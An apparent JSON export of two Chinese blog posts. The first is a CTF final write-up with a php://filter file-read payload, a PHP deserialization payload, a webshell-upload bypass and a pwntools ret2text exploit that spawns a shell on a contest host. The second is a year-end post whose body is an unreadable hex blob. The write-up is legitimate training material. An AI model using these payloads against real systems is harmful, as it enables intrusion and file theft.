[{"title":"2024山东省信创大赛-网络安全决赛-WriteUp","url":"/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/","content":"前言打了这么久的CTF,头一次拿到这么好的成绩,也是运气比价好,赛题难度并不高,就是题型种类比较多\nWEBEasyinclude就是一个简单的伪协议，打开网页之后会有个提示，仅支持php://组装下面payload即可拿到flagfile=php://filter/read=convert.base64-encode/resource=/flag\neasyserialization源码没有保存，本地的只有留下了这样的一个源码,应该是还有一个创建时初始化的一个魔法函数我这里没有，也并不是很重要\n&lt;?phpclass Challenge &#123;    public $file;    public function __wakeup() &#123;        if (isset($this-&gt;file) &amp;&amp; file_exists($this-&gt;file)) &#123;            echo &quot;Reading file: &quot; . htmlspecialchars($this-&gt;file) . &quot;\\n&quot;;            echo file_get_contents($this-&gt;file);        &#125;    &#125;&#125;if (isset($_GET[&#x27;data&#x27;])) &#123;    $data = $_GET[&#x27;data&#x27;];    $object = unserialize(base64_decode($data));    if ($object instanceof Challenge) &#123;        echo &quot;Object loaded successfully!&quot;;    &#125; else &#123;        echo &quot;Invalid object.&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n这个就是一个简单的反序列化题目直接通过下面php代码可以拿到payload\n&lt;?phpclass Challenge &#123;\tpublic $file = &quot;/flag&quot;;\tpublic function __wakeup() &#123;        if (isset($this-&gt;file) &amp;&amp; file_exists($this-&gt;file)) &#123;            echo &quot;Reading file: &quot; . htmlspecialchars($this-&gt;file) . &quot;\\n&quot;;            echo file_get_contents($this-&gt;file);        &#125;    &#125;&#125;$a = new  Challenge();echo(base64_encode(serialize($a)));\n输出的payload就是Tzo5OiJDaGFsbGVuZ2UiOjE6e3M6NDoiZmlsZSI7czo1OiIvZmxhZyI7fQ==直接把这个通过get方法提交一下即可拿到flag。\nEasyUpload就是一个简单的文件上传,他只是在前端做了校验,直接关闭js或者通过bp改包就可以直接上传一句话木马。\nEasyXSS这个似乎只要触发一个js即可拿到flag,我这里提交的内容是alert(&quot;a&quot;)就直接出flag了\n贪吃蛇这道题是一个贪吃蛇的小游戏，打开如果失败的话会疯狂弹alert,但是在js代码中有一段,我没截图,主要内容是当分数达到10000分数的时候会去访问/check_score.php?score=&#123;score&#125;,这个score是js获取的一个前端的分数,这里直接去访问,并且提交的分数改成10000即可拿到flag\nCRYPTOSnake拿到一个xlsx，内容如下全部拿到后内容如下\n71736E6374667B333939623130D226139343D293663336D246366466623564303365346364307D\n虽然这一看就是一个hex,但是需要注意的是第二排需要按照倒叙的方式来解,倒叙后内容如下\n71736E6374667B33393962313063642d633366392d343931622d6466623564303365346364307D\n解密后flag如下qsnctf&#123;399b10cd-c3f9-491b-dfb5d03e4cd0&#125;\nxor??-未解出这个没解出来。。题目如下\nfrom Crypto.Util.number import *from sympy import *from secret import flag,p,qm = bytes_to_long(flag)e = 65537n = p * qc = pow(m,e,n)gift = (p &amp; ((1 &lt;&lt; 512) - 1)) | ((q &amp; ((1 &lt;&lt; 512) - 1)) &lt;&lt; 512)assert (p &gt;&gt; 512) | (q &gt;&gt; 512) == p &gt;&gt; 512print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;c = &#123;c&#125;&quot;)print(f&quot;gift = &#123;gift&#125;&quot;)&#x27;&#x27;&#x27;n = 22300263779226600333707473198598647654586791738192786487872341060549374464515756464831291121794493491628026410031636012731224310283780712705127946876337346792983330169999708383502979934455218977341916203480043646330249706425191087158768772897284824714215310750500324405913078513586115942973598972028456719258412752868858010367332454700749465077295893753856300090205499399672260914493625284837623170771182663958262375169538237641806992429167611040610962810390047099494198147686583829074495458147901228382344710045093591497591069538588549638706624689358708178742953378013980352591578590565561973692754878065312844684039c = 2789349312179674828983519895012288021364883565541096223573403043876145063155298742667101315206330923965626225224722216578129785473659597135634073481357017163156801089623720545920267633251219433978329233179047589516882719597561666650966835698340944488882002550160001904108294903200508334328339836462532458745875470345613890981070063190554683505521428298485976862346790095837034606211107203193453017429253887699383192730893936894968671587051400342232432929531973833505733677046502666077369824478853033623369528901115690813846094658073821756265042291548636374267713902023795637057278347955318752713402772285916021781682gift = 131398839321309540646267063721349417789603592370980593410155240946696431870464030053462906524477650498948454139295406557167508415001798276366289094569175144435884833537410440153695724327068254496589876483771534218696482878357965602053184992717780586024384289674850266219571906505500511285657212316507394933353&#x27;&#x27;&#x27;\n高等数学1题目内容如下\n在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d作为flag提交提示：phi_n = (p-1)*(q-1)，将e和phi_n进行反函数求模即可。\n通过下面脚本即可拿到flag\ndef mod_inverse(a, m):    m0, x0, x1 = m, 0, 1    while a != 0:        q = m0 // a        m0, a = a, m0 - q * a        x0, x1 = x1, x0 - q * x1    return x0 % mp = 473398607161q = 4511491e = 17phi_n = (p-1)*(q-1)d = mod_inverse(e, phi_n)print(d)\nflag为flag&#123;125631357777427553&#125;\n高等数学2题目内容就是这些东西\np = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034\n通过下面脚本拿到flag\nimport gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(m)\nflag为flag&#123;5577446633554466577768879988&#125;\nDHDH-未解出题目如下\nfrom random import *from hashlib import *from Crypto.Cipher import AESfrom flag import FLAGp = 62606792596600834911820789765744078048692259104005438531455193685836606544743g = 5def DH():    a=randrange(p)    b=randrange(p)    A=pow(g,a,p)    B=pow(g,b,p)    s1=pow(A,b,p)    s2=pow(B,a,p)    assert s1==s2    return s1,pow(A,2*b,p)def pad(msg):    l=16-len(msg)%16    return msg+l*chr(l).encode()s,hint=DH()key=sha256(str(s).encode()).digest()aes=AES.new(key[:16],AES.MODE_ECB)cipher=aes.encrypt(pad(FLAG))print(s&gt;&gt;64)print(hint&gt;&gt;64)print(cipher.hex())&#x27;&#x27;&#x27;13615023537181423352907568230267665510037465421408690103761828232899563452375539387989530262337663045447357617554114fe9d5504337268af5038f5f538d6e27c2a5d69b50edb8fdb3d085227090fab85f34c19fb3b32f6a1c667373d4ce9d5b0&#x27;&#x27;&#x27;\n没解出来。。。\neasyrsa这道题。。佩服出题人提供的附件，里面直接就是flag,直接看题吧\nfrom Crypto.Util.number import *flag = b&#x27;flag&#123;C@d0_1s_s0_3asy!&#125;&#x27;#assert len(flag) == 22def getMyPrime(e):    while True:        mp = getPrime(128)        if (mp - 1) % e ** 2 == 0:            return mpe = 23p = getMyPrime(e)q = getMyPrime(e)c = pow(bytes_to_long(flag), e, p * q)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;n = &#123;p * q&#125;&quot;)print(f&quot;c = &#123;c&#125;&quot;)&#x27;&#x27;&#x27;e = 23n = 63465293776825804886780705907118514318354492203844885746068763972603420624459c = 8415448673923521810157495017636043788928337310356253266903946044592128831391&#x27;&#x27;&#x27;\nflag为flag&#123;C@d0_1s_s0_3asy!&#125;\npower-未解出题目如下\nfrom Crypto.Util.number import *from os import urandomfrom secret import flagm1 = bytes_to_long(flag[:len(flag)//2]+urandom(128-len(flag)))m2 = bytes_to_long(flag[len(flag)//2:]+urandom(128-len(flag)))p = getPrime(512)q = getPrime(512)e1 = getPrime(16)e2 = getPrime(256)n = p * qc1 = pow(m1,100,n)c2 = pow(m1,201,n) + e1c3 = pow(m2,3,n)c4 = pow(m2,5,n) + e2print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;c1 = &#123;c1&#125;&quot;)print(f&quot;c2 = &#123;c2&#125;&quot;)print(f&quot;c3 = &#123;c3&#125;&quot;)print(f&quot;c4 = &#123;c4&#125;&quot;)&#x27;&#x27;&#x27;n = 118551384105265891143241093249027825785975552077598433349491906297304376014433545146681576312672860392895740874135183252592199074916652958722532441310299368574407429281595875200076325010809218722569831431269164222918750275453537587439380341362035526268555097575973427405577674303858695799268503307304543423063c1 = 87457268939573192120622126045719881506636419685131068960408775013001944668364075230248268273203778617951381294781106811900667729470329301342312615051787830757000315684365286434709267452816294982790221925573245151823415334741569605616576940338843584693128994087886808502555759223154299903971565577448316614328c2 = 23392680863562877012124860793229018418883106005846624676772731890613378685805549920531076176062442715192138578953654144535984477169391436311656848448046539545152124987757977144390574606249346989360826293515584270674930169101305999135460549834043565483952429374211671151759029303142617642249979924561633750189c3 = 116753531119914702189998091085515603804982822177797634882657879640256939859927348236382130729654062151110736357566214962573821592383741851497033566349080757310118522485134928318404912851656846501838656571530273243817671246806755397617788624067212148734009764625213083816577180905485446541197197725696652742410c4 = 101789432173086940827318148304924220350912310081074818752138448179662865165901494216292145407356834573752612403409055879217358167304865760311271596169839803911734092110080837804490998553946188023988886261546960169606191495262688174204421558754825485142547673746018349734656483749257460610084980119145152844839&#x27;&#x27;&#x27;\n根本解不出来。。。\nMISC隐藏的信息打开附件，数据是这样的base64解出来之后全是一个16进制的数据，通过010Editor复原一下文件他的文件头是PNG直接用png打开发现下面内容没啥思路，直接拖随波逐流拿到flagflag为flag&#123;lsb_steg_so_easy&#125;\n不想上早八附件包一个txt提示,一个流量包,一个zip,提示信息如下\n经过学生举报，有一个学弟经常说不想上早八。于是往老师的电脑里传了一个文件，不过文件被加密了【加密内容.zip】。已知该学生可能会将密码设置为老师的电脑密码，网管中心截获了该学生往老师电脑传送文件的一部分数据包，你是否能通过这个数据包获取到登陆密码，并成功拿到加密内容里的内容再分析出FLAG呢？\n流量包就俩流，0里面直接就是密码通过xyvtc2024拿到压缩包内容里面有非明文数据，可以继续通过随波逐流的这个工具来解密flag内容为xyvtc&#123;9bfd8ebf-e0e0-48f7-85ab-051075e2167c&#125;\n奇怪的压缩包这个附件拿到之后是有密码的,他是一个伪加密,解压后是下面的内容这就是个二维码，给补齐标识位即可拿到flag，补全后的二维码如下flag内容为xyvtc&#123;People_who_know_CTF_are_the_most_affectionate&#125;\n最后一个MISC附件内容都是16进制的内容通过010Editor复原内容是一个ppt,直接看ppt我是没拿到flag,改后缀zip,解压到本地搜索flag就可以直接拿到flagflag内容为flag&#123;1ff93348-0abd-4e2a-9023-9effe8ad789b&#125;\nREVERSEez_Android附件给了一个apk,这道题没做出来,但是我们老师解出来了,方法是直接解压之后直接搜索flag打开这个文件即可拿到flagflag为flag&#123;bd8ccdea-b67d-4ec6-b489-eb3bde3342a2&#125;\n其他EasyGo、KSGO、你看得懂汇编吗、数字计算可以通过我队友LeonChows的博客查看到\nPWNcode-未解出这个ida分析main函数的时候会报错，这个问题还不会解决，估计是有个函数没办法反编译，只能看汇编，这里也是没办法，就没搞\nint-未解出这个看了看似乎是一个字符串的题目，感觉难度比较高PWN这块目前就学了栈溢出，后面没学到还直接放弃了。。\nmath这个和初赛的一道题目很像，脚本拿回来改一下即可，就是一个算术题，之前是和程序比速度，谁先算对100即可拿到bash，这次是100秒内算出100道题目可以拿到bash，脚本如下\nfrom pwn import *io = remote(&quot;192.168.0.2&quot;, 32265)correct_count = 0io.recvline()io.recvline()io.recvline()while True:    msg = io.recvuntil(b&quot; = &quot;).decode(&quot;utf-8&quot;).strip()    print(f&quot;script:&#123;msg&#125;&quot;)    if &quot;=&quot; in msg:        try:            a = msg.split(&quot;=&quot;)[0].strip()            result = eval(a)            print(f&quot;script:计算结果: &#123;result&#125;&quot;)            io.sendline(str(result))            correct_count += 1            print(f&quot;script:当前答对次数: &#123;correct_count&#125;&quot;)            aaa = io.recvline().decode(&quot;utf-8&quot;)            if aaa == &quot;恭喜挑战成功!\\n&quot;:                io.interactive()        except Exception as e:            print(f&quot;script:无法解析表达式: &#123;msg&#125;, 错误: &#123;e&#125;&quot;)    else:        print(f&quot;script:收到无效消息: &#123;msg&#125;&quot;)\ntext这个很简单就是ret2text,ida分析道-函数直接就有system(&quot;/bin/sh&quot;)直接拿到地址0x401214偏移甚至都不需要通过gdb去看直接看ida分析v1就32，因为是64位程序，直接+8偏移位数就是40，脚本如下\nfrom pwn import *# 利用地址run = 0x0401214#io = process(&quot;./text&quot;)io = remote(&quot;192.168.0.2&quot;,30682)payload = flat([b&quot;a&quot; * 40 , run])io.sendline(payload)io.interactive()\n\n\n","categories":["CTF相关","WriteUp"],"tags":["CTF","WriteUp","WEB","CRYPTO","MISC","REVERSE","PWN"]},{"title":"2024年终总结 - 希望这是一切的开始","url":"/2025/01/24/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%20-%20%E5%B8%8C%E6%9C%9B%E8%BF%99%E6%98%AF%E4%B8%80%E5%88%87%E7%9A%84%E5%BC%80%E5%A7%8B/","content":"\n  469890ec6a7a5e53ececc7e0b86ffd2a5ebec039a01b753b44feef229223e38eb093b393935e2435df539c15bbffc98dff8230fe9d8b5e967ab5d314edd93204513854c5f17d4eca6cc20eaf92c3756b164d90d17b5c0a9726cfdd41caff99ed2ae2e63541c9d6d7c0239703c26f7a76bad3a4e3159e6b306f3270e62d6ef02302d4abf349ee75d18a103df06628deef210d013a25518e4004a2e64c5742d54f76f2ef5ac7426a5cedcd4204810db1e49e70fe43336d3043fec686bdb56748ef31c7017bf13c2fd6ddaeacf6f90c9de0d11dd26ce0e60cb8848200a99f50c6f2af01649f4c48bf9467e4c21bf6b5dd2355deceea5cd7710f61b05389f58c005a168f8a65e7445868fc2f0a4dfaecf16f1c1ce4ae77d166c92dcda2bf76cb473aadc1ac580f00c7dea0b9de92b80c224eb781f8c90348aaf3791ad5b2dbc73e15e75359a13b2c026353f166352fe95684face473fb3004b8e6d04d3652226a4bc18a9fdf4d2bcc4593064e3837f1fd3ba4086a94e481c95fe20a18bb7c178163fc53865bc2eaccbbb480927306598b457943d8c8c37ac6b822bf83a915ac78862a442050e2057fb9df126ecfd179dc32ee72e7a859953ae9845859388d34069084433bbde82878907e1d056ead87a735568a717b17717ebf53e5652cbb2458428c43e38b0cbfd8f9c989fc00a453eed02f8a4096610f25ad10c05488418a94297a86e9d2b7f6a609b202baa48e9cc3b9367863e38c9ffd08c9b25ad4e37a0980b0c7c5a6307dea4fe52695d3e37636b0fa42af2beadf5be4d677870e0bb77d7f2fabe7f174df4e6d6eab21e1c5f78f56a380ae3bb4d2c5a3865a52eaa9e97a704c312a8c89770a41835b86e868f3bf4de0a1b36642c816d4c8ae5184506e0d98fc6dd2878028946ad6f73f5e48581d0af1573a28f778888c46fbbed7aaab125ea31e72d65fc425fbab5ee42dd0d7198f7a4d78a915c0f6012db2f542a0544bff864d7d490388a8299192b9aa4357be724fd7c39ff2855637501699bfacce165c2cc0ec4fd74352d04e72f98097b51091589632b681795c44f891bca42d7c52fae78129106d7cf2bc81b6c6ca2ce687e47757a4b68cddeeef802c6d0449769b22b5d54a1954673f63446f0e4e4b1fe6d61da8d9241d6a70c97a67898e1dc93558ca1ff2272e8bd6d4f3bca61c4a2d500843b7c5e1c6670c1da68dce68cef4242f0d37ea76c0d257fd67225039547cc29eddb8b246eda1877db39a33555aff841ec9acbdc25f06a224d8f6e025ae9227bca32c4d2d003a8932e3232c841a804d0be88177626c5218a8ff82b3e8236f63396188b15119b7babd9864bcad4aad6a385efb181e437b640b32da049056fa1f4878ac2a47558433e2a4223abc6b527b18aa601b40572cbf0684e0cf3b8b46031e421e8ff2112c9cbe89bd84e43d480ae67bf0d395f6b99ab886da59aeb82eb8f640b1dc423e060ae6a4b60fbb833098bc419346033395d89e6a3c1a132ca45282b20d4bcc04084a032609b7900c71b207bc9e75b4f2ebe6de294b665df949ae8b1a536ab08033ee5b1ad7083b9bb9414e209c55fc5ef2d017a1edb0a415e71211d03c8511476487d7d60ce9ed9418a30daa0c45b70aba3d6d1e0ec0e94d7865dec1fb1cb391d3bebe1510f48a67b7405e711b85e09b0a139be162bb18adba7581aa08b0a3a4bc262db6fa0bfa89402dbb5f9835c498a0660e014b3b4c248fb397949eba89c010fa337ba19522fcabfe5f8168a7bc30296270e497cab5910a00aa172c68b2afc526753e52bd9fc98a5a2626bff94ea2345efc56e16a46306784a8c5422d35ec82b8814d4fe4eef63ec92d07ba0c99b875724e36ee7ddb8c5535705c2b79703062003bb6df226115d80081170de4041a74775a17ad9336307a2fde8c1b2fe24f94691bb0b501e3952a18d5d0a173e693447c04391d92c912527e8a3cd9aa6ae73d3bd90a697f5d5d89cdb1ad3faee5a7cca6abcd51e3ddbb02df6e1722e2e81d0477b85e9a4ebb2a4ee321ac98c79f1ac97e2181f93a24cfc133d7a675a454ed378530e05ff6ed22914cac5b1b383a93dda532dd3bd15b799db492354d72f46dceb67eb22694e4a1e811cc0c6fc77ba3f1ef242345a9af5bc0bf1b050d540a708852ab08b5eb360a6c7d79948960ef62431a929b36b86135038b9d70337615b0f181da227647a5336b53d694777a700023ab3b6840f33de95aedd3d5c30c7d21bd93ac50d5ee1f5d4d45468b97ff5217aed492e90557398b636f9c5f3aa499fdc2a794d2d5862c9e6bf8af14ec1396195f6040be6da1a84d9328f9ace87587d1ee4c2b5e04f53a347a3ee89e1a32f0865da55e506449d227056309c160c42a4a23fc32b8311141a398ad21b02e4d785d5ed8784db897a5e730943cd812d28173c113efcdce0b43f6bab49b3094f911ef266fe521c5eedf85fa3346a548ec071bca770eaac2d1fc82c02e54e42ddb2b18b0d403267af2c1b5c6180fa21f4df27f91bd8851e6cccc3a0004e2077eb728711be98f6a7142df9578965041305672124f2adc8f0b7d07592d1e6a60a87ffe53975a33f6f03526d00c6cdafd287ae3b0e926f1147a020907a8540e59456537db56f33dc0fe35e4c4e8ab2ecb5152c87242d87882a5eadbdb4f337de0025561e4bc815548aafeec7bb8dc0391875320a73a430813b5491a9eb6e80cab2b6ad3099d1d5e1293ffa0fd8922f1825b201db0c3a1f9215678a8ef546285a1a20ec8a62710e814d59d191ee60e120fa70b1358fafa2b8bc31f41b3c2fa6fa892551354e9bac66bd437917e5c3940a3dd45cad7c5c1d4a2350660e27a44df8814e9c56ca6adf1716a3d0cab756b99094bdc2130f73b52ce99d2a0f591486d59b8d161ee57e14f1901466dd347cf9ca74157944b37173787cd8f89c5868fe67fca02ce3ebb5bdbb521a371d7a032137acd033714a51fe68b4054d8aa5e29587f00bc4eb5f4a078c0bfdcf210b68673bb107c814bfaa36914d03c4fc04268ccfc7b72ad4a2fb969ab53714da3c9520ae1e377129f62cb632682d4f54a99d1a6b99e413a1aee4fc65077785d741f8a870830d959985bbfc7ef0c1a63824347a5f1213ed8b3420322ec559190464872727185c7f3e2a84d04b301e70da66be82837790d8744d05e9c5b0f0fca0609de35e312bfe517e7ec864e444fd69e6438c97ab74b82ac69bf236ca41165d75b2db6cdec60a181443be44aea5e7bccfe744668553a2e4e81e8f3cc891e0d04871c1dabc0282a9c51eda88f1bcb4b6f6ef291c0b568fbc1410364ac2f17282d0afcdc40f7f1666b43f6c8123302940cb453a1726e38200fd15e3502a93e135084983882c93ab7110733b73c4985c984d082077e1247d2801073140e95187486d6f1fe90f1a48aff571035b3805e9639397e92097f8291fde64869e41128562c326423d1877d75199d67d937c154fc7bf2a3380a807361b88a5546b3d1260b0689cffe8af1dbee6fda0530b59c7d0b6163e203b38cdcaa39c0553c44099cd60ca9ba19c3e9578ea1e4bdc3fd68161bf5b005a735f04fa52d1c23a6d44030dffb9120a2a915485080bad8565e48adf34611d9fc060705648cb7c2ba2ec27f9704accfaccb7d784e982a7723a8a2d84eda0345c1034d934721d565a268d2f21db9bd81a679652889e6d78bcfa544b9f288a2d907fe0a0852de0e73b16b61742802d0fac80d515c880758fb6106654bf76a4ac120607e2a284d353d311f50039b9117c89922739f36c6ae8b22b773cd7272662f2b6550c43c577c07c188bb6736bb175abd6376a95baddad97206568369b23a01b6b317734ee654bc144c00f38766cffaf8d02989fec3e8d71dd999b54a112f64737de0a2f4e12e69e59e750203a9454148ebb3918b6c4d55c8bd2496a47d6a8b03f8dd3ceffac5ed082aff8811f8c397039df2233bba7fbc0e16b6de80525bef094ba9a449b1f0a526b1c28a3556707307488c332da8cbc59f6de7963db289d514114f6226695cd26c6bd86074649c06c288b038802e7280dbe903b0984c62046e39dcd8eab9311068d5f235b20a39ef0c16974a8bbdcc96a74ee0057ff358a8ccf32dfd17498887ec928a960cdf7ad88cf92bb3cfbd80736a1d34d5e3ea238fd3848bb547f61f280d4131cf6f7415552a866d4cfd45e3c8bde0b46fd03155f2cb6684546164682ecd4c41675bd9f1b1f4f4bc008a70b8f242bb29b3d5b42e3b82ad72b336dfa8661bba621c428c0c549b89dc62188fcac944793522119170c13e29d27ea7f13bc23a1f2f5912fb81a06c13ce864865d09c24cc79bdd4baf57cc7bdb3fcda52e5f6170262f5c73f0faeac19eedb4377bb01888e8152e79b6778bbc6ec2619e995cf3b1374518bfa339f6df5841eccb18cf3643099ec48a83de46c7966fbd4bb5c49a1509da8c55a716aa14d35b28f8a0f1834dfdec3ca635ba6f443d40e6f2b7f16a6df8fda8903b66078a90af06fa557daf10333de6926fc4f1193da464f5260d73ec1835f579fce93ebbd0f403e1facb59513660c688a90df45d9fa8204433ec3a9da13cb18768255f8176a1c60face7fbfc64101a769fead7ff44d5d4b0b4e0e1fbddc9fbc32a1655e9f73dbb99996ef861ad78e9534dea83378dbbecffb6cc53d428f16d193c8fc75e0d3d182388c359acbe7729df31bdea014a76c2d682e0cfb64716669fd0e424811cbc50678bdbd346f97221eb039fb429f150a050f21988c00cc24d1d0de76294403ae06bd74e2dad27d65fe734e2486ede6f7fb0701593b63d0395dbe86ebddb41dc795d67feb0ad171009c036b8a816133f9f1adca0b5234afe59daea951e19a9b94df32c15677687286254d1b05a22f990040428883723f8d5482a6589ecfc65271933a6c5255c7396a6a0eb6e8c2342eb8066f7426a7c7c25b98544d7141b885dbf5bb1dfaa70519eefb9ec2da9321f6a8713192e527e5e0a1d7ded0545e86e57aca05cd2abce95ca543e78b2c23414cfbf6ffb5984988e356e34d3529e4d3e1c55610ffd83016b91c5a26a2b6d3a9a5a0edbca5efad9fa40a938c4b3b064579b72ca4117862b7a05fa6e7b84d9c718fabbebd49320c1cc7e5b79e3352baaeb4b9702c04b0f7206bcd45d7ef42c368d36c6152c3e29d5bf048bc0b4f5adf97a9b65f7b2a2f12cd14338b23c8bbee368ecbc25cf989e548b8531c090747303544426b2c06f196f3c44058e97f25b53069f72492dbc57f4bd89d53a4d17744844a8f45e29a08cbdd2e9071528c1e6638b65a92cf8da5acdacf9bb2d1a1c6b4e06f65dad70ee3de4802e1ba72a2ab998b9ef0670768228707a44c8d21d1c429c4130731dd95e8981b082208f59920a07222a9aea6d650a123b273574b1693b039ec5a1566aaff4d8a1f15056fedeff60e01319aeca1723b77e68bfbaf0edcf0204a4ef19c1668ef3488a941cd5ae94459ba8d793ad1f404b0824fb7521efe38f23e685d4e342ec188d6f7dd8f198244330630621cf9b816a9ab1152ae8ec3768ff387dab32a44d2b3c852fc62d85e80aa4baeb64f8b7f6e7967b3f9360187ea18425d023fa8cbc822ae079aa85b4b4c0ba75281422ff2855f2ba53bfa9b266b0801b4f9dcef7a29678062eda7e468c214331ce0ca2e31a5dd140134e9de180fd9fcdffe3ec5f5f5348479f31d8236000e6329b46d8c3c1476c1500a194b971652ae028597837ee74bd35e7de49aef249238999611688eaec0d0c4e80c82cdd9b21245ceb157048fc3108947d10ab7d8a463328eee92e991ca644af802758d9f2db329e4cb5d3ab66328cd905f045a5beb7ad926d2071d392a060db8ca0cf68fcdaf2593cb46d8461f784cc88a25034aeaefc97ebead67d627df70d1627b165a2f310e6851ff05462b64f48d54b5c75a336989f9fc8b45ced997f5a7cdd5ac0f5c2b06cb7bbcc22a02e4a4a6a6f8d8669033325f50b807c66788e0d3002b0aa44904cbb315bc71416897b2f223a4a3c5b9508e5dd24b5d890b6314211886c0e02824e246e47a23c5cd86322f8055a994c05b5d7074f0457019903abaa46288ffc086e82d2b6d1a9537db7945be20c041a5bcc8675aaf4bcb24b500c7ae84ab478d40a1aa1412061292f7084d22c2b21554a3ed9ba446d49dfb3b6525f3993ee8bb735f32d3145444e52f5c19c2ed0655148ed288bf23227764ea96ff5c9d1b988c9624a19a654c234d768c702b033fc567f57553d28adeb509d330f2acc28e177c52ac4075d2995aa9f2f465924862c2b2a79973a4c874608f3ebf7bdaceaebd5373cb9fed769c4d4681f764cf139bfced5f22f8608fc85727dc091cc24357636066d5a6b47e7fd7d8bded563605b16f6f63ab1e4a66a929414ddb97084750a5a4c8fbfce91140747167e529ca47227af651d377dcd826c135c101aeb621f3190f5a4570cefcca9df36c3da8575f0757352cb00ed0c546a871ac518cbb4ec87ddff625e762670424997cf04a41bb16ed7113525eb01aa84bedac348954cffff45a324f09f7eb7d7c083f32af1bb6b58bd75cf34673f0c327da11e32d4b59d230f8b3dfe49ab366599d2fc96cfe5b6146c6048a6a541583c80dd05992951cf419aa82ce3bf1699b2e6a7b308243db47e3fba658bb4540bce663cd0800b8c2926cc2fa42bc1e0c0c5b60060d9b2f1a0b5813b29cfa78c957c06743c868be845cf302033c78900fbc2366bd1dd4b56a202cda7dfd17fc271d83b54bda62d2608055f562cec8ac5de37faf6ee7e6505ba467aac4e1ac2535ec03f4e1d51a63e1dc5ac2c201f7af1c169ca5cb1837a96e97aca2c2e0bb67fe36e6980bf0fa27d09da84db63c7ff4cfa0e59206a3cd8e6f8b7640779a532e6f29bdb536bb8917a8ab4fdeb852c094938ad3a0cf31b64bc245e71ca3f0fb74ade6a5ec65ed910cde90c8175492196626604e529728c6d1f25636feec593cadfaf4fac96fd39abf91458341a9b204be84d82738b34485e5d9f875b0a4461a8c8f3a57ccb642caa4447da9529be585790535bcb8586d32096ecd1f29711af4c89cef28cf49c59881d07c36adca5bbfbf980a74ddd2fb3eb3ccde83298549739906e47f2dc6462952800e2a4d5c088c22c2c20c81fdc6212a865dc716f95482eaedc0b21ebe01d51681165ab2aa42a1f30deac52d3f4596c6bbdde4c4a694634c45b431df29f10bd629bcb605664e4f31a63f19f5bbc708aa7df2f7f71243e2a62b705325842840bfdc24f2ba8e01e385e4f60ed69cc1a3fde442fe569cdca1a9d20f59d948cf7989338a39e9a2183b8401bf22fa67411196052fa43e8b14c773a1764168945f57f0713654aeb04078bdde2286a8adc55bbc18686bb91a5e04c4250aa86ea7b821e9c1fafed3fbd011ef49f0aa36e4f09f5391d729185ecf6262f0a4ebc62b67f99f6b3a9747fc0a0200788775973890d17896995d3870991374bb9ec27168b839f94c28b4b9d30e6fcb928c496780d8a4f3c458b6d49ba968e5bb3169cce22a4e23ef6602d0a607f7eabbd083c49ed59355cd4b6775bbdf31f37218988a6b8fb8ee686ed11422c354e3990c29999bde7a2d139b5b34eb2970fb5033d7c9a180407cd94667efb144052f209cbd9a772b47b626c7d0c2ffd15f0f78028fe7822778346298f720ec03a889ac0b7ef02cba983ce7d2e6cb092ace6896d3ab042c8123a4db766cf0464979c7ca2908286e15efb3e2ac1d735211a2c0a4161308872dbfc97a5d42c0e3d8d114bf9c7fb6a38a03f0fcc3058a5fba684feb681e760a06c1c18f5ece83b4e1755db394e2f4c5a8a821353c9bed350d49edfb92696c0c158918c9202552082cd5e2a2fa1c48fc8d742eb03dcea7d4243ecf4e1a5795d8039ebb310ca3ffb3f2c0d55a12b24b3941f19cf8526704f225f645c6f466b0175852b7a651c730525b0ccbda5eb6b4cd12d3eab64df0c761261519b33e2ee2bc3b935d197ecd3db0d02e1d7b41488054a4ee65c5f835e68069b8138a454ecf90793d5570c6b22276ab41ba732560bfadf4c60839ed203d0f9a73352ae6ca8c7a58cd08cc0cb5ddf5af3d24ebe336e52536fa95afd0d1868cebbfa86077ff40394c87aa9ab6b2acaf6bbf0a1ba0a3b6080e998d06e13add7c50758df0c58cefd351aa4f40c586eec74473fe413432bff1c9930cff685425fcc0b9b734416c489417efb5a7c367ccd2ba2336b553836562d6c203c6122a399f3d7e1c4c66f55a9d2e25eaeb9fc043d2638cfc5b1edf123678614e632f4f32d19b0758cff14c68232269007cc6e502a66e1198b6d6ccc6c7a1353cde0e04d99be3532b244caadb506a2dd8e77bd00185c979a645295916c6b3cb1be7dc4b12cd56263c5c9e0789e384b44966237dd11c4770d27168937b575c511562c24d0f99bc3db4ee1c2075af70dcc80c60b29f896cba21199fd8419b72cf79697d6b68e4c5ddf3299cf7e4874930d12681e07141a5a972fa04ef47a013051d79d8b6afdda6e649b1473132a4c33a4a30109f5728b03fd75b7d418af9b6ab1d4e73f05f1056408b0c3c627aae36ee9bb5d896a662f71e685cf0b8a8d22e35defcd43521b1a5223a512fe19db3e9b7ff542cfde14f3e5c5ff664a7ca3f7074dafd78568720c49de714b14d7fc8352e976dbf9d5a77233875c6a18f90790e361f4f4de9324d52a9d2f40b667a5b9c48a38aba8a9fd5b86e62d7c4cff69d2f7c57bde498937c9be33ee40a162ce83442b781e54b658299dc981fc7ad0b1fb43bf03f91eb3eb161080a4882942fe28b2964eef50f498581e4f022c61d21432a9e20e82d07829034d8c96ddc8cda21f471cb5dae95dd6973b958db36b68cc380e3507d3d056067a1c1f03368